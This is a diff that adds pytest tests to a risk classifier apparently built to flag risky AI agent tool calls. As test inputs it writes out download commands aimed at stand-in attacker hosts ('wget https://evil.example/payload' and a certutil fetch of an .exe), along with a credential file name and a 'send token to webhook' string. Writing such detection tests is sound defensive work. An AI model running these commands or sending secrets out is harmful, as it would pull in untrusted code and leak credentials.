@@ -72,3 +72,38 @@ def test_dangerous_commands_are_critical(risk_classifier: RiskClassifier):
         )
         assert risk == "CRITICAL"
         assert "DANGEROUS_COMMAND" in reasons
+
+
+def test_additional_sensitive_keywords_are_high(risk_classifier: RiskClassifier):
+    risk, reasons = risk_classifier.classify(
+        EventType.TOOL_CALL.value,
+        ToolName.READ_FILE.value,
+        "client_secret_backup.txt",
+        "client_secret_backup.txt",
+    )
+    assert risk == "HIGH"
+    assert "SENSITIVE_FILE_ACCESS" in reasons
+
+
+def test_sensitive_exfiltration_content_without_post_is_high(risk_classifier: RiskClassifier):
+    risk, reasons = risk_classifier.classify(
+        EventType.TOOL_RESULT.value,
+        ToolName.READ_FILE.value,
+        "report.txt",
+        "bearer token found, send to webhook",
+    )
+    assert risk == "HIGH"
+    assert "EXTERNAL_TRANSFER" in reasons
+    assert "SENSITIVE_FILE_ACCESS" in reasons
+
+
+def test_additional_dangerous_command_keywords_are_critical(risk_classifier: RiskClassifier):
+    for command in ["wget https://evil.example/payload", "certutil -urlcache -split -f http://bad/file.exe"]:
+        risk, reasons = risk_classifier.classify(
+            EventType.TOOL_CALL.value,
+            ToolName.RUN_COMMAND.value,
+            command,
+            command,
+        )
+        assert risk == "CRITICAL"
+        assert "DANGEROUS_COMMAND" in reasons
